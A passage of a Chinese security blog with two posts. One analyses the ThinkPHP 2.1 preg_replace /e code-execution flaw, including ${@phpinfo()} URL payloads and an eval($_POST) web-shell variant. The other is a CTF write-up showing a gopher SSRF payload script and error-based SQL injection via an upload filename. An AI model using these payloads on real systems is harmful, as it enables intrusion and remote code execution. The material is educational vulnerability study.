<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class="line">                <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这一段代码是对分组进行处理首先判断是否有分组，默认是否能从分组获取变量。$paths=explode( $depr,trim( $_SERVER[‘PATH_INFO’],’/‘)); $_SERVER[‘PATH_INFO’]是返回用户查询语句查询的真实脚本后面的url真实路径<br>比如<a target="_blank" rel="noopener" href="http://127.0.0.1/1/url.php/test/test/1.php?test=123%E8%BF%99%E7%A7%8D%E6%A0%BC%E5%BC%8F%E4%BC%9A%E8%BF%94%E5%9B%9Eurl.php%E5%90%8E%E9%9D%A2%E7%9A%84%E8%B7%AF%E5%BE%84%E4%B9%9F%E5%B0%B1%E6%98%AF/test/test/1.php%E3%80%82">http://127.0.0.1/1/url.php/test/test/1.php?test=123这种格式会返回url.php后面的路径也就是/test/test/1.php。</a><br>而之前 $depr = C(‘URL_PATHINFO_DEPR’); C(‘URL_PATHINFO_DEPR’)是PATHINFO模式下的分割符号。</p>
<p>所以这段代码本地测试了一下经过exlode处理后上面那段url的返回值是<br>Array ([0] =&gt; [1] =&gt; test [2] =&gt; test [3] =&gt; 1.php)<br>array_shift是去除数组的开头单元。那么$var最后的值是去除了[0]这单元的数组或者为空。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  该代码块首先检测路由规则，如果没有制定规则则按照默认规则进行URL调度，在preg_replace()函数中，正则表达式中使用了/e模式，将“替换字符串”作为PHP代码求值，并用其结果来替换所搜索的字符串。<br>正则表达式可以简化为“\w+/([^/])”，即搜索获取“/”前后的两个参数，$var[‘\1’]=”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码，在PHP中，我们可以使用${}里面可以执行函数，然后我们在thinkphp的url中的偶数位置使用${}格式的php代码，即可最终执行thinkphp任意代码执行漏洞</p>
<p>这一段就是thinkphp2.1命令执行的问题所在了，看看这段代码到底做了什么。<br>这里其实是因为preg_replace \e修饰符的问题，这个修饰符会把第二个参数当成php代码执行。简单结合上面的语句来说就是$ var[‘\1’]=”\2”;它把这个当成了一个回调函数，而1和2是implode($ depr,$paths)执行结果来代替。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$depr</span>=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="variable">$var</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$res</span>= preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>,<span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line">print_r(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>当输入<a target="_blank" rel="noopener" href="http://127.0.0.1/html/1.php/module/%7B@phpinfo()%7D">http://127.0.0.1/html/1.php/module/%7B@phpinfo()%7D</a><br>这种url时会打印出Array ( [module] =&gt; {@phpinfo()} )<br><img src="https://img-blog.csdnimg.cn/dc9d2872af2c4f8fa7090a795bbe7f50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>当输入<a target="_blank" rel="noopener" href="http://127.0.0.1/html/module/%7B@phpinfo()%7D%E6%97%B6%E4%BC%9A%E6%89%A7%E8%A1%8Cphpinfo()">http://127.0.0.1/html/module/{@phpinfo()}时会执行phpinfo()</a><br>本地做测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;$&#123;@phpinfo()&#125;;&quot;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;b&#x27;</span>,<span class="number">2</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    print_r(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到<br><img src="https://img-blog.csdnimg.cn/05453706db6c4348b058e94019cb5ded.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这样写phpinfo()是可以执行成功的。然后把中间的代码改成了<br>$ a=array(0=&gt;”$ {@eval($_POST[s])};”,1=&gt;’b’,2=&gt;’c’)。<br>仔细想想其实因为数组赋值的问题，你用$标识一个变量之后，他是把变量的值赋给0所以就会导致执行。</p>
<p>而这个漏洞的利用格式为什么必须是index.php/xxx/xxx/xxx/${@phpinfo()}<br>是因为这里还是在这个文件，214到224行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$routes</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$route</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span> === stripos(<span class="variable">$regx</span>.<span class="variable">$depr</span>,<span class="variable">$route</span>[<span class="number">0</span>].<span class="variable">$depr</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 简单路由定义：array(&#x27;路由定义&#x27;,&#x27;分组/模块/操作名&#x27;, &#x27;路由对应变量&#x27;,&#x27;额外参数&#x27;),</span></span><br><span class="line">                    <span class="variable">$var</span>  =  <span class="built_in">self</span>::parseUrl(<span class="variable">$route</span>[<span class="number">1</span>]);</span><br><span class="line">                    <span class="comment">//  获取当前路由参数对应的变量</span></span><br><span class="line">                    <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(str_ireplace(<span class="variable">$route</span>[<span class="number">0</span>].<span class="variable">$depr</span>,<span class="variable">$depr</span>,<span class="variable">$regx</span>),<span class="variable">$depr</span>));</span><br><span class="line">                    <span class="variable">$vars</span>    =   explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$route</span>[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$vars</span>);<span class="variable">$i</span>++)</span><br><span class="line">                        <span class="variable">$var</span>[<span class="variable">$vars</span>[<span class="variable">$i</span>]]     =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">                    <span class="comment">// 解析剩余的URL参数</span></span><br><span class="line">                    <span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)\/([^,\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure>
<p>thinkphp路由的格式是分组/模块/操作名/参数。而参数是被带入执行的。以这种格式传入的会执行命令。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangshuwin/p/7607120.html">转载自大佬博客</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/07/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AFweb/">第二届网刃杯web部分</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-07</time><div class="content"><h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h2><p>一道SSRF<br><img src="https://img-blog.csdnimg.cn/ebc028637faf45fc821017dd2db8fbf3.png"><br>看大佬博客发现查看网络情况<br>（学到了，学到了）<br><img src="https://img-blog.csdnimg.cn/f3abe6f299b249cda5eb2675a46d06eb.png"><br>发现100这个ip有不同<br>访问<br><img src="https://img-blog.csdnimg.cn/dd10c285d71a402bbb3ea2c2509b2bf3.png"><br>随便传过去一个a，b看大佬博客发现利用exp<br>(利用gopher发送http请求)<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">gopher详解</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /?a=1 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.73.23.100</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 3</span></span><br><span class="line"><span class="string">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="string">Referer: bolean.club</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">b=1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">tmp = urllib.parse.quote(payload)<span class="comment">#对payload进行url编码</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;?url=gopher://172.73.26.100:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)       <span class="comment"># 因为是GET请求所以要进行两次url编码</span></span><br></pre></td></tr></table></figure>
<p>得到路径访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//<span class="number">172.73</span><span class="number">.26</span><span class="number">.100</span>%3A80/_%250D%250APOST%<span class="number">2520</span>/%253Fa%253D1%2520HTTP/<span class="number">1.1</span>%250D%250AHost%253A%<span class="number">2520172.73</span><span class="number">.26</span><span class="number">.100</span>%250D%250AContent-<span class="type">Type</span>%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%<span class="number">25203</span>%250D%250AX-Forwarded-For%253A%<span class="number">2520127.0</span><span class="number">.0</span><span class="number">.1</span>%250D%250AReferer%253A%2520bolean.club%250D%250A%250D%250Ab%253D1%250D%250A</span><br></pre></td></tr></table></figure>
<p>最后得到flag</p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>打开题目，上传文件，发现php无法上传，于是上传一个txt文件报错<br><img src="https://img-blog.csdnimg.cn/4b19320c543d43aa8691bd3e717e2a24.png"><br>修改type为ctf上传成功<br>题目提示与sql有关，尝试在filename加个单引号（逐个尝试）<br>发现报错<br><img src="https://img-blog.csdnimg.cn/ff7c8e7c9c01499d9f5573a1bf6ca7c9.png"><br>推测为报错注入<br>先报库</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(select extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()))))</span><br></pre></td></tr></table></figure>
<p>没显示，<br><img src="https://img-blog.csdnimg.cn/4d5816c3bc794a75b7a07df68dc224c5.png"><br>有回显了<br><img src="https://img-blog.csdnimg.cn/0d270d618f0d43959a8540a4603edc7a.png"><br>接着报表，报端<br>发现不行（由于文件名字长度有限制）<br>盲猜一下<br><img src="https://img-blog.csdnimg.cn/e77e9da6dd9a480c88093e46f6959049.png"><br>仅出现一部分，利用substr函数<br><img src="https://img-blog.csdnimg.cn/044f4f4f4f1a4f748bde60dc7ea11cc1.png"><br>得到flag<br>由于在进行注入时总是多一个），看大佬博客发现<br>主页源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;ç®€å•ä¸Šä¼ &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸Šä¼ &quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);        </span><br><span class="line">    ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">    error_reporting(-<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="variable">$dbname</span> = <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">        <span class="variable">$filename_hz</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span> ,<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="variable">$filename_</span> = end(<span class="variable">$filename_hz</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$filename_</span>, <span class="variable">$name</span>) || <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$tmpname</span>   = <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$name</span>      = <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_name</span> = md5(date(<span class="string">&#x27;YmdHis&#x27;</span>).rand(<span class="number">100</span>,<span class="number">999</span>).<span class="variable">$name</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$filename_</span>;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;insert into upload_file values(&#x27;<span class="subst">$file_name</span>&#x27;);&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>, <span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$file_name</span>))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&quot;</span>.<span class="string">&quot;/upload/<span class="subst">$file_name</span>&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot; &quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;............ctf&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>需要）来闭合。<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1630134">报错注入</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>